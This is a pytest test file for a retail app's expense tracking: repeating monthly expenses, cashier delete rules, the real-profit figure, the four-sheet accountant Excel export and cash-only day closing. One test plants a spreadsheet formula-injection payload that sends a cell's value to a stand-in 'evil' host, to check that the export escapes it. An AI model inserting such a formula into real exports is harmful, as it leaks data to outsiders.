"""Expenses (migration 313, services/expenses.py): quick add, repeats once a month, the month view and
Real profit, the accountant's Excel, and Day closing counting only cash."""
import io
from datetime import date, datetime

import pytest

from app.services import day_closing
from app.services import expenses as ex
from tests.fake_supabase import FakeSupabase

T = "aaaaaaaa-0000-0000-0000-000000000001"
ITEM = "cccccccc-0000-0000-0000-000000000001"
NOV = date(2026, 11, 22)


@pytest.fixture
def db(monkeypatch):
    monkeypatch.setattr(ex, "today", lambda: NOV)
    db = FakeSupabase()
    db.add("catalog_items", id=ITEM, tenant_id=T, name="Soft silk", cost_price_paise=145000)
    db.add("deals", tenant_id=T, stage="won", won_at="2026-11-10T10:00:00+05:30", total_paise=257250, gst_paise=12250,
           invoice_number="INV-1", customer_name="Meena")
    db.add("deal_refunds", tenant_id=T, status="done", amount_paise=10000, created_at="2026-11-12T10:00:00+05:30")
    db.add("stock_movements", tenant_id=T, catalog_item_id=ITEM, variant_id=None, delta=-1, reason="sale",
           created_at="2026-11-10T10:00:00+05:30")
    db.add("stock_ins", tenant_id=T, bill_date="2026-11-05", total_paise=500000, items_paise=476190, gst_paise=23810,
           bill_no="SMT/1", supplier_id=None, supplier_gstin=None)
    return db


def test_quick_add_fills_the_name_and_refuses_bad_amounts(db):
    row = ex.add(db, T, {"amount_paise": 120000, "category": "transport", "method": "upi"}, None)
    assert row["label"] == "Transport" and row["method"] == "upi" and row["day"] == "2026-11-22"
    for bad in (0, -5, "x", 10_000_000_01):
        with pytest.raises(ex.ExpenseError, match="amount"):
            ex.add(db, T, {"amount_paise": bad}, None)
    with pytest.raises(ex.ExpenseError, match="future"):
        ex.add(db, T, {"amount_paise": 100, "day": "2026-12-01"}, None)


def test_repeats_are_added_once_on_their_day(db):
    ex.save_repeat(db, T, {"category": "rent", "amount_paise": 2500000, "day_of_month": 1, "method": "bank"}, None)
    ex.save_repeat(db, T, {"category": "salary", "amount_paise": 6800000, "day_of_month": 30}, None)
    rows = db.rows("cash_expenses")
    assert [(r["label"], r["day"]) for r in rows] == [("Rent", "2026-11-01")]  # salary's day hasn't come
    assert ex.run_repeats(db, now=NOV) == 0  # not twice
    assert ex.run_repeats(db, now=date(2026, 11, 30)) == 1
    assert ex.run_repeats(db, now=date(2027, 2, 28)) == 1  # salary: 30th → last day of February (rent is on the 1st)


def test_a_deleted_repeat_entry_does_not_come_back_next_morning(db):
    ex.save_repeat(db, T, {"category": "rent", "amount_paise": 2500000, "day_of_month": 1}, None)
    ex.delete(db, T, db.rows("cash_expenses")[0]["id"])
    assert ex.run_repeats(db, now=date(2026, 11, 23)) == 0 and db.rows("cash_expenses") == []


def test_a_cashier_deletes_only_what_they_added_today(db):
    row = ex.add(db, T, {"amount_paise": 5000, "category": "food"}, "cashier-1")
    old = ex.add(db, T, {"amount_paise": 5000, "category": "food", "day": "2026-11-20"}, "cashier-1")
    with pytest.raises(ex.ExpenseError, match="only what you added today"):
        ex.delete(db, T, old["id"], user_id="cashier-1", manager=False)
    with pytest.raises(ex.ExpenseError, match="only what you added today"):
        ex.delete(db, T, row["id"], user_id="someone-else", manager=False)
    ex.delete(db, T, row["id"], user_id="cashier-1", manager=False)


def test_a_closed_day_takes_no_new_cash(db):
    db.add("day_closings", tenant_id=T, day="2026-11-20")
    with pytest.raises(ex.ExpenseError, match="already closed"):
        ex.add(db, T, {"amount_paise": 100, "method": "cash", "day": "2026-11-20"}, None)
    assert ex.add(db, T, {"amount_paise": 100, "method": "upi", "day": "2026-11-20"}, None)


def test_the_excel_never_runs_a_formula(db):
    from openpyxl import load_workbook
    db.rows("deals")[0]["customer_name"] = '=HYPERLINK("http://evil/?"&B2,"Open")'
    content, _ = ex.month_excel(db, T, "2026-11")
    assert load_workbook(io.BytesIO(content))["Sales"]["C2"].value.startswith("'=")


def test_stock_loss_stays_in_its_own_month(db):
    db.add("stock_counts", tenant_id=T, status="finished", finished_at="2026-11-15T10:00:00+05:30", loss_paise=500000, gain_paise=0)
    assert ex.month_view(db, T, "2026-10")["profit"]["expenses_paise"] == 0


def test_real_profit(db):
    ex.add(db, T, {"amount_paise": 2500000, "category": "rent", "method": "bank"}, None)
    view = ex.month_view(db, T, "2026-11")
    assert view["profit"] == {"sales_paise": 245000, "refunds_paise": 10000, "cogs_paise": 145000,
                              "expenses_paise": 2500000, "profit_paise": 245000 - 10000 - 145000 - 2500000}
    purchases = next(a for a in view["auto"] if a["key"] == "purchases")
    assert purchases["amount_paise"] == 500000 and purchases["in_profit"] is False  # never counted twice


def test_another_month_is_empty(db):
    view = ex.month_view(db, T, "2026-10")
    assert view["expenses"] == [] and view["profit"]["profit_paise"] == 0 and not view["is_current"]


def test_the_accountants_excel_has_four_sheets(db):
    from openpyxl import load_workbook
    ex.add(db, T, {"amount_paise": 420000, "category": "electricity", "method": "upi"}, None)
    content, name = ex.month_excel(db, T, "2026-11")
    wb = load_workbook(io.BytesIO(content))
    assert name == "anril-2026-11-for-accountant.xlsx" and wb.sheetnames == ["Summary", "Sales", "Purchases", "Expenses"]
    assert wb["Sales"]["B2"].value == "INV-1" and wb["Purchases"]["B2"].value == "SMT/1"
    assert wb["Expenses"]["C2"].value == "Electricity"


def test_day_closing_counts_only_cash(db):
    ex.add(db, T, {"amount_paise": 5000, "category": "food", "method": "cash", "day": "2026-11-22"}, None)
    ex.add(db, T, {"amount_paise": 420000, "category": "electricity", "method": "upi", "day": "2026-11-22"}, None)
    rows = (db.table("cash_expenses").select("amount_paise").eq("tenant_id", T).eq("day", "2026-11-22").eq("method", "cash")
            .execute().data)
    assert [r["amount_paise"] for r in rows] == [5000]
    assert ".eq(\"method\", \"cash\")" in open(day_closing.__file__, encoding="utf-8").read()


def test_a_bill_must_really_be_a_photo(db):
    row = ex.add(db, T, {"amount_paise": 100}, None)
    with pytest.raises(ex.ExpenseError, match="isn't a real"):
        ex.attach_bill(db, T, row["id"], b"not a pdf", "application/pdf")


def test_a_retried_save_is_not_a_second_expense(db):
    first = ex.add(db, T, {"amount_paise": 120000, "category": "transport"}, "user-1")
    db.rows("cash_expenses")[0]["created_at"] = datetime.now(ex.IST).isoformat()
    again = ex.add(db, T, {"amount_paise": 120000, "category": "transport"}, "user-1")
    assert again["id"] == first["id"] and len(db.rows("cash_expenses")) == 1
